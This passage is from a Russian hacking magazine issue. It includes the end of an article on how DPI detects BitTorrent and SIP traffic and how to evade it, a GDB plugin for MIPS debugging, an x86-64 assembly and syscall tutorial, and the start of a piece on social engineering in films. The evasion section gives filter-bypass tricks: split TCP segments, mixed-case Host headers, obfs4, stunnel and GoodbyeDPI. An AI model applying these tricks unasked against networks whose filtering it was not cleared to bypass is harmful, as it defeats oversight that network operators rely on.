    бутивом Ubuntu 18.04. Самое главное — то, что в нем описаны тре керы —
    специальные регуляторы. Обычно это просто серверы HTTP, которые знают,
    кто из других участников сети готов отда вать тебе новые данные, а также сле‐
    дят за твоим прогрессом и ста тусом в системе.
      Первым этапом для ска чивания торрента будет запрос пиров через HTTP
    или TCP, который системы DPI способны обнаружить либо по  IP, либо
   по директиве Host в запросе. Кроме этого, в теле запроса обязательно будет
   Bencode — характерный исклю читель но для соединений BitTorrent.
      Вторым этапом идет обмен рукопожатиями с только что полученными
    пирами. Для каждого из них специально хра нятся четыре параметра:
    am_choked и peer_choked — запрещена ли передача данных от пира
   и обратно, am_interested и peer_interested — есть ли у пира или у меня
    что‐то ценное для передачи.
      Рукопожатие с пирами, как и запрос к трекеру, запол нено данными (иден‐
    тификатор клиента, хеши файлов и так далее) с помощью Bencode. Это поз‐
    воляет облегчить задачу идентификации. Более того, в зависимости от вер‐
    сии  протокола  и  клиента  внутри  данных  может  содержаться  строка
    BitTorrent protocol (или дру гая, характерная для клиента), что еще боль‐
   ше упрощает идентификацию.
      Третий этап обще ния, а именно обмен данными происходит через соеди‐
    нение UDP. Сообщения управляют потоком данных и состояниями choked
   и interested и, глав ное, передают сами данные. Часть этих сообщений име‐
    ет строго фиксированную длину тела запроса. Это может послужить зацепкой
    в исследовании трафика обо рудованием DPI.
      Эти этапы заметны, что позволяет анализирующему оборудованию легко
   обнаруживать  и, соот ветственно, блокировать и замед лять соединение.
    Некоторые производители обру бают попытки соединения на корню. Другие
    же, более смекалистые, подделывают тра фик так, что для клиента все выг‐
    лядит как обычно, но загрузка не идет.


   VoIP
    Voice over Internet Protocol — важнейшая часть современного обще ния. Толь‐
    ко Skype пользуются 300 миллионов человек в месяц. При помощи этой тех‐
    нологии совершаются звонки в WhatsApp, Telegram, Viber и не только.
      Конечно, обстановка в отношениях между VoIP и DPI менее напряженная,
    так как нет ни строгого регламента взаимодействия двух клиентов, ни общего
   формата данных, а некото рые приложения так и вовсе шифруют соединение.
     На помощь анализатору приходит SIP (Session Initiation Protocol) — про‐
    токол, описывающий то, как клиенты начина ют, регулируют и заканчивают
   общение между собой. Внутри описывается нес коль ко параметров, причем
    в таком же формате, как и HTTP, и благодаря этому легко отслеживается.


    INVITE sip:10100@192.46.18.48 SIP/2.0
    From: "User 1" <sip:10100@192.46.18.48>
    To: "User 2" <sip:1201@192.42.20.22>
    Call‐ID: 22a1c6b515ecee@192.46.18.48
    Max‐Forwards: 10

    Как и HTTP, SIP имеет собственные трехзначные статусы, которые переда‐
    ются в открытую, и все это в комплекте поз воляет DPI если не с первого, то
    со второго или третьего пакета данных определить протокол и немедленно
   предпринять необ ходимые действия.


  МЕТОДЫ СОПРОТИВЛЕНИЯ
   В борьбе с DPI важно обмануть ска нер, который рассчитан на обыч ные зап‐
    росы. Небольшие изменения в структуре зап росов помешают его работе.
      Лучшим способом ввес ти ана лизатор в заблуждение будет полностью
   зашифровать пакет данных и отпра вить его на личный, никому не известный
    сервер в интернете, который рас шифру ет данные и выполнит запрос. Ровно
    такую методологию предлага ет obfs4proxy.
      Изначально придуманный как пос редник при передаче данных в сети Tor,
    obfs4 может также работать в режиме клиента и сервера, поз воляя прак‐
    тически любому приложению перенаправить тра фик в обфусцированный тун‐
    нель. С этим отлично справляется, нап ример, OpenVPN, создающий еще и
   защищенный шифрованием канал данных.
     OpenVPN может также изоб ражать легитимный трафик HTTPS, который
    анализатор DPI соч тет самым обыкновенным.
      Этого можно достичь, перенаправив поток VPN через порт 443 вместо
    стандартного 1194, но это помога ет не всегда. Или можно использовать stun‐
    nel в качестве туннеля SSL. Тогда шифрование SSL сделает запросы HTTPS
    практически неотличимыми от пакетов данных туннеля, помогая скрываться
    от грозного ока DPI.
     Можно попытаться и напрямую обмануть ана лизатор трюками из мира
    сегментов  TCP. Методика  разделения  длинных  пакетов  на  маленькие
    для уменьшения потерь использует параметр TCP  Window  Size, регули‐
   рующий поток данных через соединение. Предварительная установка его
    в значение 2 для каждого пакета раз делит пос ледний на два сегмента.
      Первый:


    GE

   Второй:


    T / HTTP/1.1
    Host: xakep.ru

   Ни один из этих пакетов не будет вос принят как валид ное соединение HTTP,
   и поэтому соединение пройдет все фильтры.
      Блокировку по адресу сайта (по директиве Host) обойдет и такой запрос:


    GET / HTTP/1.1
    hOSt:xaKeP.RU

    Чтобы не пришлось обфусцировать каж дый пакет вручную, есть утилита
   GoodbyeDPI, которая делает эту работу за тебя. Она поз воляет подобрать
    наилучшие комбинации изменений, чтобы твой запрос миновал всевидящее
    око DPI.


               INFO

                        Подробно об утилитах для сок рытия своего тра‐
                         фика я писал в статье «Краткий справочник ано‐
                           нима. Виды шифрования и защиты  трафика,
                         выбор софта».



   ЗАКЛЮЧЕНИЕ
    Как видишь, алгоритмы анализа трафика идут вровень с технологиями обхо‐
    да. Каждый новый шаг в раз витии слежки за трафиком пользователей будет
    усложнять схему получения дос тупа к «чистому» интерне ту. Сообщес тво
    активных пользователей стремится сохранить интернет свободным от кон‐
    троля и цензуры, и благодаря этому мы можем продол жать работать в откры‐
    той сети.
 ТРЮКИ

ОТЛАДКА
MIPS

КАК Я СОБРАЛ
РАБОЧИЙ ИНСТРУМЕНТ
ИЗ СЛОМАННЫХ
ЗАПЧАСТЕЙ





           GH0st3rs
       qiqwoe@protonmail.com





  Не знаю, как тебе, а мне часто приходится сталкиваться
  с реверсом и отладкой на MIPS. И как ни печально, но дос‐
  тойных инструментов для этого совсем мало, особенно если
  сравнивать  с  другими  архитектурами. Да  чего уж там
  говорить, если даже в HexRays до сих пор нет декомпиляции
  MIPS. Поэтому лучшим решением для меня стало сконстру‐
  ировать собственный инструмент.


               INFO

                       MIPS — микропроцессорная архи тектура, которая
                        была разработана в восьмидесятых годах прош‐
                           лого века сотрудниками компании MIPS Computer
                         Systems в соответствии с концепцией проекти‐
                         рования процессоров RISC (то есть для процес‐
                         соров с упрощенным набором команд).


  В этой статье речь пойдет именно об отладке с помощью всеми проклина‐
  емого любимого GDB. Сначала я хотел най ти какое‐нибудь решение, чтобы
  каждый раз не вво дить тонну магических команд типа x/* $reg, которые
  помогают понимать то, что происходит с регистрами, стеком, кучей и прочим.


  ГОТОВЫЕ (ЛИ) РЕШЕНИЯ?
   Я, как адекватный человек, полез в Google в поисках готовых инструментов,
  которые помогут облегчить мою жизнь. Вот что мне удалось накопать.


               INFO

                    GDB по умолчанию имеет поддержку исполнения
                          скриптов, через команду source или аргумент
                         коман дной строки ‐x. В случае если GDB был
                         скомпилирован с поддержкой Python, появляется
                             также   возможность   использовать   скрип ты
                          на этом языке.



  PEDA
  A точнее — PEDA‐MIPS. Скачиваем и запускаем.





                 Никаких переживаний о пользователях

  Понятно: у меня везде стоит Python 3, который не допускает одновременного
  использования табуляции и пробелов в качес тве разделителей, а авторы,
  видимо, не слышали о прекращении поддержки Python 2 в 2020 году. Ну
  да ладно, исправим это и запустим еще разок.





                          Результат работы

  И вроде бы все хорошо, но хочется большего: нап ример, поддержку IDA Pro
  или удобный вывод сос тояния кучи. Раз бирать ся почти в 7000 строк, чтобы
  добавить новую фичу, не очень‐то заманчиво.
    Плюсы:
  + может работать с MIPS;
  + простота реализации.
   Минусы:
  ‐ 7000 строк кода в одном файле;
  ‐ отсутствует расширяемость.


  GEF
  Скачиваем и приступаем к тес тирова нию.





  На этот раз хотя бы запус кается без оши бок. Но строки здесь не разыме‐
  новываются.


               INFO

                        Разыменование — термин, применяемый к ука‐
                           зателям, позволяет получить значение, записан‐
                         ное в области памяти, на которую ссылает ся ука‐
                             затель. В случае со строками очень удоб но, ког да
                           в результате такого чте ния отладчик вместо пос‐
                          ледовательности 0x41414141 показывает строку
                     AAAA.


  Идем в код, чтобы узнать причину, и, перело патив около 10 000 строк кода,
  видим, что GEF настолько хитрый, что не понимает бинари, в которых не
  определяются сек ции, а в случае с MIPS это практически каждый второй. Зато
  GEF умет работать с IDA и даже импорти ровать структуры! К сожалению, и тут
  не без косяков…





                            Не, ну вы это видели?!

  Сначала сообщается, что имя метода сос тоит из строчных букв, а затем мы
  проверяем его, но уже на наличие заглавных букв: естественно, проверка
   всегда будет возвращать ложь.
    Плюсы:
  + может работать с MIPS;
  + изящно выполнена система команд.
   Минусы:
  ‐ 10 000 строк кода в одном файле;
  ‐ много логических ошибок.


  Pwndbg
  Запускаем и… сразу разочарова ние!





  Как выяснилось позже, гра мотная реализация отображения для MIPS тут
  не написана, однако наличие модульной структуры меня порадовало. Опре‐
  деленный набор команд, схожий по назначению, выведен в отдельный файл
  или даже каталог. Это поз воляет легко ори ентироваться в проекте и быстро
  вносить изменения.
    Плюсы:
  + модульная структура;
  + развитая система событий — почти к каждому действию привязано нес‐
   колько событий.
   Минусы:
  ‐ утилита слишком перегружена событи ями;
  ‐ нет главной цели — удобства дебага исполня емых файлов для MIPS.


  КОД ФРАНКЕНШТЕЙНА
  Можно ли сделать отладку для MIPS красивой и удобной, взяв лучшее от всех
   этих решений? Задавшись этим воп росом, я захотел попробовать самос‐
   тоятельно объединить их во что‐то, что будет отвечать моим требованиям.


               INFO

                    GDB предоставляет хорошие API для Python. Под‐
                         робнее о них ты можешь узнать на стра нице про‐
                            екта.


  Структуру проекта решил взять из pwndbg — вынести код в отдельные файлы
  либо группировать по катало гам, это улучшает понимание и облегчает под‐
  держку в будущем.
    В GEF хорошо реализована система команд — это отдельный класс, нас‐
  ледуемый от gdb.Command, со своими плюшками в виде красивой печати
  справки.
    В PEDA я подсмотрел, как просто реализова ны некоторые методы. Нап‐
  ример, достаточно взглянуть, как в GEF реализовано определение того,
  находится ли по указанному адресу строка или нет, и сравнить c PEDA.


  GEF
  def read_ascii_string(address):
      """Read an ASCII string from memory"""
      cstr = read_cstring_from_memory(address)
      if isinstance(cstr, unicode) and cstr and all([x in string.printa
  ble for x in cstr]):
          return cstr
      return None



  def is_ascii_string(address):
      """Helper function to determine if the buffer pointed by
  `address` is an ASCII string (in GDB)"""
      try:
          return read_ascii_string(address) is not None
      except Exception:
          return False


  ...
  if is_ascii_string(start):
      ustr = read_ascii_string(start)


  PEDA
  def examine_data(value, bits=32):
      out = self.execute_redirect("x/%sx 0x%x" % ("g" if bits == 64
  else "w", value))
      if out:
          v = out.split(":\t")[‐1].strip()
          if is_printable(int2hexstr(to_int(v), bits // 8)):
              out = self.execute_redirect("x/s 0x%x" % value)
      return out

  Зачем на такую простую операцию навеши вать обработчики исключений
  и несколько раз считывать память, мне понять не удалось. Мой вариант
  реализации можно найти тут.
     А весь проект я окрестил pwngef, ты можешь ска чать его с моего GitHub
  и использовать в свое удовольствие.


             WARNING

                       Во время работы была замечена очень плохая
                         особенность GDB  API  для  Python,  связанная
                          с чте нием значения регистра. В некоторых ситу‐
                          ациях  API возвра щал отрицательное значение
                            из‐за банального переполнения типа int. Приш‐
                          лось   закодить   это   временным   костылем:
                     0xFFFFFFFF + reg_val + 1, что позволяет
                          восстановить переполненное значение.


  Проект состоит из несколь ких файлов и директорий:
   • gdbinit.py — начальный скрипт, который необ ходимо подгру жать в GDB
     через x или source;
   • pwngef — директория с «сердцем» плагина;
   • pwngef/color — каталог со скриптами, отвечающими за раскрас ку пла‐
     гина и его составляющих;
   • pwngef/commands — каталог с обработчиками дополнительных команд,
     каждая команда — это отдельный класс, наследу емый от GenericCom
     mand — базового клас са, который содержит функции обработки парамет‐
     ров для каждой команды и реализует приятный формат вывода справоч‐
     ной информации;
   • pwngef/functions — каталог с обра ботчиками функций в GDB. Пока
     до конца не реализовано;
   • pwngef/*.py — скрипты, реализующие базовые функции;
   • scripts — плагин к IDA Pro для вза имодействия с GDB.


  Про фит
  На момент написания статьи плагин поддерживает следующие архитектуры:
   • i386;
   • x86‐64;
   • MIPS;
   • SPARC;
   • SPARC64;
   • ARM;
   • AArch64;
   • PowerPC;
   • RISC‐V.

   Да, в нем еще не так много реализова но, как у конкурентов, поскольку он
   только проходит стадию первичного раз вития. Но уже сейчас можно опро‐
  бовать основные функции.
    Начать работу с ним очень прос то, дос таточно запустить GDB со сле‐
  дующими параметрами:


  $ gdb ‐x ./pwngef/gdbinit.py

  Или один раз прописать его в автозагрузку и забыть:


  $ echo "source ~/pwngef/gdbinit.py" >> ~/.gdbinit

  После запуска через команду self help мы можем узнать актуальный список
  дополнительных команд, которые нам доступны.





  Поменять параметры можно, выполнив команду self config param value;
   чтобы посмотреть список текущих параметров, дос таточно выполнить self
  config.





  Сразу после подключения к gdbserver, например командой target remote
  host:port, перед нами появляет ся текущий контекст исполнения.





  Взаимо действие с IDA Pro
  Загружаем в IDA плагин ida_script.py.





  Устанавливаем адрес хоста, где работа ет IDA:


  pwngef> self config ida.host '192.168.1.2'

  Мы можем синхронизировать точки оста нова с IDA. Ни для кого не секрет, что
   IDA — это в основном хороший дизассемблер, а вот как отладчик фай лов ELF
  подходит не очень. Поэтому удобно в процес се реверса разобрать весь код
   в IDA, установить там точки оста нова и разом экспортировать их в GDB —
  для проверки той или иной теории. Все, что для это го нужно, — выполнить
  команду ida bp в pwngef.





  Вкратце пройдемся по дру гим полезным функциям, которые уже есть
   в pwngef.
   • Трассировка фун кций с зак рашиванием в IDA базовых бло ков.
     Это помогает в динами ке увидеть, какие ветви кода активизируются в тех
     или иных ситуациях. Для активации нужно выполнить команду ida trace
     0xADDRESS.





   • Мож но включить отоб ражение дизассемблирован ного вывода
    из IDA. Опять же, удоб но, когда ты разреверсил в IDA весь код (вос ста‐
     новил структуры названия функций и так далее), перенести этот результат
     для наглядности в GDB. Отладка становится при ятнее и информативнее.
     Выполняем команду self config context.use_ida True.





   • Разыме новы вание строк, как для сте ка, так и для регистров.
    Происходит автоматичес ки при печати стека или регистров.





   • Фун кция hexdump. Ну, это уже мейнстрим. Hexdump есть везде — эта
     функция позволя ет отобразить раскра шенный вывод памяти по указан‐
     ному адресу. Нужно выполнить команду hexdump [address] [size].





   • Отоб ражение аргу мен тов для вызываемой фун кции. Еще одна
     полезная опция, которой по умолчанию нет в GDB. Чтобы каждый раз
     перед вызовом функции не вбивать вручную отображение соответству‐
    ющих регистров, можно наб рать команду ctx args, и это будет делаться
     автоматически.





   • Ко ман да next или n в MIPS теперь не заходит внутрь каж дой
    фун кции. Чаще всего GDB не видит стековый фрейм и не может понять,
     где начинается или заканчивается функция. Мне удалось это исправить.
   • До бавлена воз можность чте ния кучи, с раз биением на чан ки.
     Команда — heap chunks [base_heap_address].





   • Есть воз можность настро ить цве та по вку су.

  В планах:
   • расширить возможнос ти;
   • добавить импорт структур из IDA;
   • добавить возможность заполнения сег ментов, символов;
   • добавить разные фичи для монито рин га функций, malloc, free, strcpy и так
     далее.

  И я всегда рад предложениям по улучшению, комментариям, пул‐реквестам
  и конструктивной критике!
КОДИНГ
 ВНУТРИ
   X86-64 SYSTEMV ABI





                                      Даниил Батурин
                                         Координатор проекта VyOS
                                                      (https://vyos.io), «языковед»,
                                          функциональщик, иногда
                                            сетевой администратор.
                                                       daniil@baturin.org



      КАК ГОВОРИТЬ С ЯДРОМ LINUX
           НА ЕГО ЯЗЫКЕ





Абстракция — основа программирования. Многие вещи мы
используем, не задумываясь об их внутреннем устройстве,
и они отлично работа ют. Всем известно, что пользователь‐
ские программы вза имодействуют с ядром через системные
вызовы, но задумывался ли ты, как это происходит на твоей
машине?


Вспомним сигнатуру функции main в C:


int main(int argc, char** argv)

Откуда берутся число аргументов (argc) и мас сив указателей на их строки
(argv)? Как возвращаемое зна чение main становится кодом возврата самой
программы?
   Краткий ответ: зависит от архитектуры про цес сора. К сожалению, дос‐
тупных для начинающих материалов по самой распространенной сейчас
архитектуре x86‐64 не так много, и интересующиеся новички вынуждены сна‐
чала обращаться к старой литера туре по 32‐битным x86, которая следует
другим соглашениям.
  Попробуем исправить этот пробел и продемонстрировать прямое вза‐
имодействие с машиной и ядром Linux сразу в 64‐битном режиме.


ДЕМОНСТРАЦИОННАЯ ЗАДАЧА
Для демонстрации мы напишем расширенную версию hello world, которая
может приветствовать любое количество объектов или людей, чьи име на
передаются в аргументах команды.


$ ./hello Dennis Brian Ken
Hello Dennis!
Hello Brian!
Hello Ken!


СРЕДА РАЗРАБОТКИ
Для демонстрации мы будем использовать Linux и GNU toolchain (GCC и binu‐
tils), как самые распространенные ОС и среда раз работки. Писать мы будем
на языке ассембле ра, потому что продемонс трировать низкоуровневое вза‐
имодействие с ОС из языка сколько‐нибудь высокого уровня невозможно.


ОЧЕНЬ КРАТКАЯ СПРАВКА
Чтобы упростить чтение статьи тем, кто вообще никогда не стал кивался
с ассемблером x86, я использовал только самые простые инструкции и пос‐
тарал ся аннотировать их псевдокодом везде, где возможно. Я использую
синтаксис AT&T, который все инстру менты GNU используют по умол чанию.
Нужно помнить, что регистры пишутся с префиксом % (например, %rax), а кон‐
станты — c префик сом $. Нап ример, $255, $0xFF, $foo — значение символа
foo.
  Синтаксис указателей: смещение(база,  индекс,  множитель). Очень
краткая справка:
 • mov  <источник>,  <приемник> — копиру ет значение из источника
   (регистра или адреса) в приемник;
 • push <источник> — добавляет значение из источника на стек;
 • pop <приемник> — уда ляет значение из стека и копирует в приемник;
 • call <указатель на функцию> — вызыва ет функцию по указанному
   адресу;
 • ret — возврат из функции;
 • jmp <адрес> — безусловный переход по адресу (метке);
 • inc и dec — инкремент и декремент;
 • cmp <значение1> <значение2> — сравнение и установка флагов (нап‐
   ример, равенство);
 • je <метка> — переход на метку в случае, если аргументы cmp оказались
   равными.

Условные переходы и циклы реализуются через инструкции сравнения
и условные переходы. Инс трукции сравнения устанавливают определенные
разряды в регистре флагов, команда условно го перехода проверяет их и при‐
нимает решение, переходить или нет. Например, следующий цикл уве личи‐
вает значение регистра %rax, пока оно не станет равным 10, а затем копирует
его в %rbx.
  Для изучения ассемблера x86 я могу посоветовать книгу Programming
From the Ground Up — к сожалению, ориентированную на 32‐битную архитек‐
туру, но очень хорошо написанную и подходящую новичкам.


mov $0, %rax # rax = 0


my_loop:
  inc %rax
  cmp $10, %rax
  jne my_loop # Jump if Not Equal


mov %rax, %rbx # %rbx = 10

О регистрах: в x86‐64 их куда больше. Кроме тра диционных, добавлены
регистры от %r8 до %r15, всего шестнадцать 64‐битных регистров. Чтобы
обратиться к нижним байтам новых регистров, нужно использовать суффиксы
d, w, или b. То есть %r10d — нижние четыре байта, %r10w — нижние два бай та,
%r10b — нижний байт.


Что вхо дит в соглашения ABI?
SystemV ABI, которой в большей или мень шей степени следуют почти все
UNIX‐подобные системы, сос тоит из двух частей. Первая часть, общая
для всех систем, описыва ет формат исполня емых файлов ELF. Ее можно най‐
ти на сайте SCO.
  К общей части прилага ются архитектурно зависимые допол нения. Они
описывают:
 • соглашение о системных вызовах;
 • соглашение о вызовах функций;
 • организацию памяти про цес сов;
 • загрузку и динамическое свя зывание прог рамм.


ФОРМАТ ELF
Знать формат ELF в деталях, особенно его двоичную реализацию, нужно
только авторам ассемблеров и компоновщиков. Эти задачи мы в статье
не рассматриваем. Тем не менее пользователю следует понимать организа‐
цию формата.
  Файлы ELF состоят из нес кольких секций. Компиляторы принимают
решение о размещении данных по секциям автомати чески, но ассембле ры
оставляют это на человека или компилятор. Пол ный список можно найти
в разделе Special Sections. Вот самые распростра ненные:
 • .text — основной исполняемый код программы;
 • .rodata — данные толь ко для чтения (константы);
 • .data — данные для чтения и записи (инициализированные переменные);
 • .bss — неинициализиро ванные переменные известного размера.


СОГЛАШЕНИЯ О ВЫЗОВАХ
Соглашение о вызовах — важная часть ABI, которая позволяет пользователь‐
ским программам взаимо действовать с ядром, а программам и библиоте‐
кам — друг с другом. В сог лашении ука зывается, как передаются аргументы
(в регистрах или на стеке), какие имен но регис тры используются и где хра‐
нится результат. Кроме того, оговаривается, какие регистры вызываемая
функция обязуется сохранить нетронутыми (callee‐saved), а какие может сво‐
бодно перезаписать (caller‐saved).


Соглашение о системных вызовах
Системные  вызовы  выполняются  с помощью  инструкции  процессора
syscall.


             INFO

                     На  старых  32‐разрядных  x86  использовалось
                       программное   пре рывание   0x80,   которое
                      и поныне используется в 32‐разрядном коде.
                     Инструк ция  syscall  из  x86‐64  передает
                       управление напрямую в точку входа в пространс‐
                         тве ядра, без накладных расходов на вызов обра‐
                        ботчика прерывания.


Через регистры в ядро переда ется номер системного вызова и его аргумен‐
ты. Соглашение для Linux описано в параг рафе A.2.1.
 • Номер вызова передается в регистре %rax.
 • Можно передавать до шес ти аргу ментов в регистрах %rdi, %rsi, %rdx,
  %r10, %r9, %r8.
 • Результат возвращает ся в регистре %rax.
 • Отрицательный результат означает, что это номер ошибки (errno).
 • Регистры %rcx и %r11 должны быть сохранены пользователем.

Номера системных вызовов зависят от ОС и архитектуры. В Linux номера
вызовов для x86‐64 можно найти в заголовках ядра. На установленной сис‐
теме он обычно находится в /usr/include/asm/unistd_64.h. Для наших
целей потребуются всего два системных вызова: write (номер 1) и exit
(номер 60).
  Напишем  простейшую  прог рамму,  которая  корректно  завершается
с кодом возврата 0 — аналог /bin/true.


.file "true.s"
.section .text


_start:
    # syscall(number=60/exit, arg0=0)
    mov $60, %rax
    mov $0, %rdi
    syscall
.global _start

Код программы мы помещаем в секцию .text, как говорит директива
.section .text. Метка _start — соглашение компоновщика ld, именно там
он ожидает найти точку входа прог раммы. Директива .global _start делает
символ _start видимым для компоновщика.
  Соберем и запустим программу:


$ as ‐o true.o ./true.s  && ld ‐nostdlib ‐o true ./true.o
$ ./true && echo Success
Success


Соглашение о вызовах фун кций
Соглашение о вызовах функций похоже на соглашение о сис темных вызовах.
Детали можно найти в раз деле 3.2. Мы будем работать только с целыми чис‐
лами и указателями, поэтому наши значения можно отнести к классу INTEGER.
  К нашему случаю отно сятся следующие сог лашения:
 • до шести аргументов можно передать в регис трах %rdi, %rsi, %rdx,
  %rcx, %r8, %r9;
 • возвращаемое значение нуж но поместить в регистр %rax;
 • вызываемая функция обязана сохранить значения регис тров %rbx, %rbp,
  %r12–15.


ПИШЕМ СТАНДАРТНУЮ БИБЛИОТЕКУ
Пользуясь этими знаниями, мы можем написать небольшую стандартную
библиотеку. Прежде всего нам понадо бится функция puts, чтобы выводить
строки на стандартный вывод. Сис темный вызов write сделает за нас поч ти
всю работу. Единственная сложность в том, что он тре бует длину строки
в качестве аргумента. Его условная сигнатура — write(file_descriptor,
string_pointer,  string_length). Поэтому нам  потребуется функция
strlen.
  Сначала приведем код библиотеки, а потом раз берем ее функции.


.file "stdlib.s"


.section .text


.macro save_registers
    push %rbx
    push %rbp
    push %r12
    push %r13
    push %r14
    push %r15
.endm


.macro restore_registers
    pop %r15
    pop %r14
    pop %r13
    pop %r12
    pop %rbp
    pop %rbx
.endm


.macro write filedescr bufptr length
    mov $1, %rax
    mov \filedescr, %rdi
    mov \bufptr, %rsi
    mov \length, %rdx
    syscall
.endm


# strlen(char* buf)
asm_strlen:
    save_registers


    # r12 — индекс символа в строке
    mov $0, %r12 # index = 0


    strlen_loop:
        # r13b = buf[r12]
        mov (%rdi, %r12, 1), %r13b


        # if(r13b == 0) goto strlen_return
        cmp $0, %r13b
        je strlen_return


        inc %r12 # index++
        jmp strlen_loop


    strlen_return:
        # return index
        mov %r12, %rax
        restore_registers
        ret
.type asm_strlen, @function
.global asm_strlen


# puts(int filedescr, char* buf)
asm_puts:
    save_registers


    mov %rdi, %r12 # r12 = filedescr
    mov %rsi, %r13 # r13 = buf


    # r13 = strlen(buf)
    mov %r13, %rdi
    call asm_strlen


    mov %rax, %r14 # r14 = asm_strlen(buf)


    write %r12 %r13 %r14


    restore_registers
    ret
.type asm_puts, @function
.global asm_puts

Макросы save_registers и restore_registers прос то автоматизиру ют сох‐
ранение регистров callee‐saved. Первый добавляет все регис тры на стек,
а второй удаляет их значения из стека и воз вра щает обратно в регистры.
Макрос write — более удоб ная обертка к системному вызову.
  Функция strlen исполь зует тот факт, что строки следуют соглашению язы‐
ка С, — нулевой байт выс тупа ет в качестве приз нака конца строки. На каждом
шаге цикла strlen_loop следующий байт строки сравнивается с нулем, и,
пока он не равен нулю, зна чение индекса элемента в регистре %r12 увеличи‐
вается на единицу. Если он равен нулю, производится условный переход
на метку strlen_return.


             INFO

                    Семейство   команд    условных    переходов
                        в x86 довольно обширно и включает в себя
                      коман ду jz — jump if zero. Я намеренно исполь‐
                       зовал команды, которые мне кажутся наиболее
                         наглядными для читате лей, не сталкивав шихся
                        с языком ассемблера до этой статьи. Возможно,
                      более правильно было бы для индекса элемента
                        строки  использовать  регистр %r11,  который
                       зарезервирован как scratch register и не обязан
                        сохраняться вызываемой фун кцией.


Попробуем исполь зовать нашу библиотеку из программы на C. Сигнатура
функции asm_puts с точки зрения C будет asm_puts(int filedescr, char*
string). Выводить будем на stdout, его дес криптор всегда равен 1.
  Сохраним следующий код в hello.c:


#define STDOUT 1


int main(void)
{
    asm_puts(STDOUT, "hello world\n");
}

Теперь соберем из это го всего программу:


$ gcc ‐Wno‐implicit‐function‐declaration ‐c ‐o hello.o ./hello.c
$ as ‐o stdlib.o ./stdlib.s
$ gcc ‐o hello ./hello.o ./stdlib.o
$ ./hello
hello world

Как видим, вызов нашей функции из C сра ботал. Увы, main в исполне нии GCC
зависит от инициализаций из libc, поэтому финальную программу тоже при‐
дется писать на языке ассемблера, если мы не хотим эмулировать работу
GCC.


ГДЕ ЛЕЖАТ АРГУМЕНТЫ КОМАНДНОЙ СТРОКИ?
Ответ на это можно най ти в разделе 3.4.1, и он про ще, чем можно было ожи‐
дать: на стеке процесса. При запуске процес са регистр %rbp указывает
на выделенный для него кадр стека, и первое зна чение на стеке — количес‐
тво аргументов (argc). За ним следуют ука затели на сами аргументы.
   Таким образом, все, что нам нужно, — это несложный цикл, который
извлекает значения со стека по одному и передает их нашей функции
asm_puts.


ФИНАЛЬНАЯ ПРОГРАММА
# Константы
.section .rodata


hello_begin:
    .ascii "Hello \0"


hello_end:
    .ascii "!\n\0"


# Код программы
.section .text


_start:
    # argc — первое значение на стеке, сохраним его в %r12
    pop %r12 # r12 = argc


    # Следующее значение — *argv[0], это имя программы, и оно нам не
нужно
    pop %r13 # r13 = argv[0]
    dec %r12 # argc‐‐


    # Сохраним первый нужный аргумент в %r13 перед входом в цикл
main_loop
    pop %r13 # r13 = argv[1]


    main_loop:
        # if(argc == 0) goto exit
        cmp $0, %r12
        je exit


        # asm_puts(STDOUT, hello_begin)
        mov $1, %rdi # rdi = STDOUT
        mov $hello_begin, %rsi
        call asm_puts


        # asm_puts(STDOUT, argv[r12])
        mov $1, %rdi
        mov %r13, %rsi
        call asm_puts


        # asm_puts(STDOUT, hello_end)
        mov $1, %rdi
        mov $hello_end, %rsi
        call asm_puts


        pop %r13 # Извлекаем следующий аргумент
        dec %r12 # argc‐‐
        jmp main_loop


exit:
    # syscall(number=60/exit, arg0/exit_code=0)
    mov $60, %rax
    mov $0, %rdi
    syscall


.global _start

Соберем программу и проверим ее в работе:


$ as ‐o hello.o ./hello.s
$ as ‐o stdlib.o ./stdlib.s
$ ld ‐nostdlib ‐o hello ./hello.o ./stdlib.o
$ ./hello Dennis Brian Ken
Hello Dennis!
Hello Brian!
Hello Ken!

Логика достаточ но проста. Число аргу ментов, которое находится на вершине
стека, мы сохраняем в регистре %r12, а затем извлекаем указатели на аргу‐
менты из стека и уменьшаем зна чение в %r12 на единицу, пока оно не дос‐
тигнет нуля. Основной цикл программы орга низован через те же команды
сравнения и условного перехода, которые мы уже видели в asm_strlen.
  Поскольку форматированный вывод нам недоступен, его отсутствие при‐
ходится компенсировать отдельным выводом сначала строки Hello, затем
аргумента и только затем восклицательного знака.


ЗАКЛЮЧЕНИЕ
Мы успешно поговорили с ядром Linux без пос редников на его собс твенном
языке. Такие упражнения несут мало практического смысла, но приб лижают
нас к пониманию того, как userspace работа ет с ядром.
GEEK



7 ФИЛЬМОВ,
ПО КОТОРЫМ
МОЖНО ИЗУЧАТЬ
СОЦИАЛЬНУЮ
ИНЖЕНЕРИЮ





Одни техники атак приходят на смену дру‐
гим, но кое‐что оста ется неизменным: пока
компьютерами пользуются люди, социаль‐
ная инженерия будет оставаться в арсе‐
нале киберзлодеев. Что бы успешно при‐           Антон Карев                                                                                              vedacoder@mail.ru
менять ее, не нужно даже быть тех нарем.
Достаточно, чтобы душа лежала к лов кой
импровизации.


В качестве наглядного курса для начина ющих мы вспомнили семь примеров
социальной инженерии, которые можно встретить в популярных фильмах.


ИЛЛЮЗИЯ ОБМАНА / NOW YOU SEE ME (2013)





Это кино об иллюзионистах, которые совершают мас штабные трюки и крадут
миллионы. Сейчас снято две час ти этого филь ма, скоро ожидается третья.
Вот один из наиболее ярких эпизодов, свя занных с социальной инженерией.
«Чем внимательней смот ришь, тем мень ше видишь», — заявляет уличной
толпе волшебник Дэн ни Атлас. Пуб лика внимательно смотрит на быстро про‐
листываемую колоду карт и по прось бе Атласа запоминает одну из них. Когда
после этого он показывает всю колоду карт, никто не может найти там запом‐
ненную семерку бубен. Пока публика недо умевает, Атлас демонстративно
бросает колоду и рисует эту карту заж женными окнами ближайшего небос‐
креба.





Стратегия атаки
Иллюзионисты исполь зуют отвлекающие маневры, чтобы соз дать видимость
магии, при этом некото рые осо бенно ловкие еще и вору ют деньги прямо
под носом у незадачливого зрителя. Киберзлодеи тоже очень час то поль‐
зуются этим трюком. Например, проводят отвлекающую DDoS‐атаку, чтобы,
пока айтишники возятся с вос становлением, украсть деньги на другом конце
сети. А иногда и вся атака может быть прикрытием — как, по слу хам, про‐
изошло с лжешифроваль щиком NotPetya.


ОДИННАДЦАТЬ ДРУЗЕЙ ОУШЕНА / OCEAN’S 11 (1960)





Дэнни Оушен (Фрэнк Синатра) воз главляет группу бывших армейских сос‐
луживцев. Их цель — одновременно огра бить пять казино Лас‐Вегаса.
В одной из сцен Джош Говард (Сэмми Девис — младший), переодетый
